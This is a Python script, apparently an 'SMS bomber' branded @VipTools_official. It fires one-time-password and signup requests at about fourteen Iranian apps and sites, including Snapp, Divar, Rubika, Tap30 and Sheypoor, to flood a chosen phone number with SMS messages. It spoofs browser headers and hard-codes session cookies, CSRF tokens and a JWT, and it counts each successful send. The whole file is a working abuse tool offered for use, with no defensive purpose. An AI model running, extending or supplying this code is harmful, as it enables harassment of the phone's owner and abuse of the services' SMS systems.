from requests import get
from requests import post
from re import search
from datetime import datetime
from time import sleep
from colorama import Fore

proxy = {"https": "127.0.0.1:8000"}

global count
count = 0


def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in snapR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def shad(phone):
    #shad api
    shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        shadR = post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in shadR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def gap(phone):
    #gap api
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in gapR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def tap30(phone):
    #tap30 api
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in tap30R.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
            now = datetime.now()
            timee = now.strftime("%H:%M:%S")
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
def emtiaz(phone):
    #emtiaz api
    emH = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
    emD = "send=1&cellphone=0"+phone.split("+98")[1]
    try:
        emR = post("https://web.emtiyaz.app/json/login", headers=emH, data=emD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        global count
        count += 1
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def divar(phone):
    #divar api
    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "ersal shod" in divarR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def rubika(phone):
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in ruR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def torob(phone):
    #torob api
    torobH = {"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"}
    try:
        torobR = get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "ersal shod" in torobR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")

def bama(phone):
    #bama api
    bamaH = {"Host": "bama.ir","content-length": "22","accept": "application/json, text/javascript, */*; q\u003d0.01","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","origin": "https://bama.ir","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
    bamaD = "cellNumber=0"+phone.split("+98")[1]
    try:
        bamaR = post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "0" in bamaR.text:
            global count
            count += 1
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        else:
            print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod")
def snapfood(phone):
    #snapfood app api
    sfoodH = {"Host": "snappfood.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "21","Origin": "https://snappfood.ir","Connection": "keep-alive","Referer": "https://snappfood.ir/","Cookie": "PHPSESSID=bcj0u2e2ip2t1kn2udebkvkgfi; _gcl_au=1.1.1591575722.1597337650; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=62d2617d-3001-00b7-5a6b-0e52aa08fb2a; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _ga=GA1.2.1811884931.1597337663; _gid=GA1.2.744762790.1597337663; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_ea83604d-d58e-4acf-a94b-24676481059f; _ym_uid=1597337670421924429; _ym_d=1597337670; _ym_isad=2; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad; selected_city=1; UDID=e013f236-13ad-4544-a281-f9d8b721fcae; analytics_session_token=b96198f9-3509-6d20-60ca-d2236bdcfe7d; _gat_UA-142144292-1=1; _ym_visorc_65749873=w","TE": "Trailers"}
    sfoodD = {"cellphone": "0"+phone.split("+98")[1]}
    try:
        sfoodR = post('https://snapfood.ir/customer/app-dl/send', headers=sfoodH, data=sfoodD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if search(r'"status:"', sfoodR.text) != None:
        	landis = search(r'"status:"', sfoodR.text).span()[1]
        	if sfoodR.text[landis] == 't':
                    global count
                    count += 1
                    print(f"{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)")
        	else:
            	    print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
        else:
        	print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')

def sheypoor(phone):
    #sheypor api
    sheyporH = {"Host": "www.sheypoor.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
    sheyporD = {"username" : "0"+phone.split("+98")[1]}
    try:
        sheyporR = post('https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if search(r'"success:"', sheyporR.text) != None:
        	landis = search(r'"success:"', sheyporR.text).span()[1]
        	if sheyporR.text[landis] == "t":
                    global count
                    count += 1
                    print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)')
        	else:
            	    print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
        else:
        	print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')

def alibaba(phone):
    #alibaba hotel api
    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
    try:
        alibabaR = post('https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if search(r'"success"', alibabaR.text) != None:
        	landis = search(r'"success"', alibabaR.text).span()[1]
        	if alibabaR.text[landis] == 't':
                    global count
                    count += 1
                    print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)')
        	else:
            	    print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
        else:
        	print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')

def smarket(phone):
    #snapp market api
    smarketH = {"Host": "api.snapp.market","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Origin": "https://snapp.market","Connection": "keep-alive","Referer": "https://snapp.market/?utm_expid=.pY75G19ZSxqVL9e0bOzqzA.0&utm_referrer=https%3A%2F%2Fwww.google.com%2F","Cookie": "_gcl_au=1.1.2061927570.1597858187; _ga=GA1.2.1125304048.1597858200; _gid=GA1.2.1715017326.1597858200; _gaexp=GAX1.2.pY75G19ZSxqVL9e0bOzqzA.18534.0; _hjid=9ed8e1f0-497e-499c-b1ce-ae58867da1bf; _hjAbsoluteSessionInProgress=1; _gat_UA-115113209-4=1","Content-Length": "0","TE": "Trailers"}
    smarketD = "0"+phone.split("+98")[1]
    try:
        smarketR = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={smarketD}', headers=smarketH )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if 'true' in smarketR.text:
            global count
            count += 1
            print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)')
        else:
            print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')

def arka(phone):
    #arka api
    arkaH = {"Host": "api.chartex.net","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Access-Control-Allow-Origin": "*","Access-Control-Allow-Headers": "Origin, Accept, Content-Type, Authorization, Access-Control-Allow-Origin","provider-code": "RUBIKA","Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk","Cache-Control": "no-cache","Plugin-version": "3.12.15","Content-Type": "application/json;charset=utf-8","Content-Length": "69","Origin": "https://arkasafar.ir","Connection": "keep-alive","Referer": "https://arkasafar.ir/"}
    arkaD = {"mobile":"0"+phone.split("+98")[1],"country_code":"IR","provider_code":"RUBIKA"}
    try:
        arkaR = post('https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD )
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if search('"code_len": ([0-9])', arkaR.text).group(1) == "5":
            global count
            count += 1
            print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)')
        else:
            print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')

def sTrip(phone):
    sTripH = {"Host": "www.snapptrip.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "fa","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/json; charset=utf-8","lang": "fa","X-Requested-With": "XMLHttpRequest","Content-Length": "134","Origin": "https://www.snapptrip.com","Connection": "keep-alive","Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad","TE": "Trailers"}
    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+98")[1],"country_code":"+98","email":"example@gmail.com"}
    try:
        sTripR = post('https://www.snapptrip.com/register', headers=sTripH, json=sTripD)
        landis = search('"status_code":', sTripR.text).end()
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if sTripR.text[landis] == '2':
            global count
            count += 1
            print(print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] {Fore.GREEN}SMS ersal shod :)'))
        else:
            print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print(f'{Fore.YELLOW}  @VipTools_official {Fore.RED}[ For Exit CTRL + C ] moshkel ! ersal nashod')
